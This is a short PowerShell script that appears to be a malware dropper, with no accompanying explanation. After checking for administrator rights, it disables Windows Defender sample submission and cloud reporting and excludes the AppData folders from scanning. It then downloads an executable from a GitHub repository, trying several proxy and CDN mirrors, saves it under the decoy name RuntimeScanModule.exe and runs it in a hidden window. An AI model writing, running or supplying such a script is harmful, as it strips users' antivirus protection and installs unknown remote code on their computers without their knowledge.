$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) { exit }

Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0

Add-MpPreference -ExclusionPath ([System.Environment]::GetFolderPath("ApplicationData"))
Add-MpPreference -ExclusionPath ([System.Environment]::GetFolderPath("LocalApplicationData"))

$urls = @(
    "https://github.com/nhofx/o/blob/sellaz/o.exe?raw=true",
    "https://raw.githubusercontent.com/nhofx/o/sellaz/o.exe",
    "https://ghproxy.net/https://raw.githubusercontent.com/nhofx/o/sellaz/o.exe",
    "https://gh-proxy.com/https://raw.githubusercontent.com/nhofx/o/sellaz/o.exe",
    "https://ghfast.top/https://raw.githubusercontent.com/nhofx/o/sellaz/o.exe",
    "https://cdn.jsdelivr.net/gh/nhofx/o@sellaz/o.exe",
    "https://gitcdn.link/repo/nhofx/o/sellaz/o.exe",
    "https://raw.gitmirror.com/nhofx/o/sellaz/o.exe"
)

$moduleExe = "$env:TEMP\RuntimeScanModule.exe"
foreach ($u in $urls) {
    try {
        Invoke-WebRequest -Uri $u -OutFile $moduleExe -UseBasicParsing -ErrorAction Stop
        if (Test-Path $moduleExe) { break }
    } catch {}
}

Start-Process -FilePath $moduleExe -WindowStyle Hidden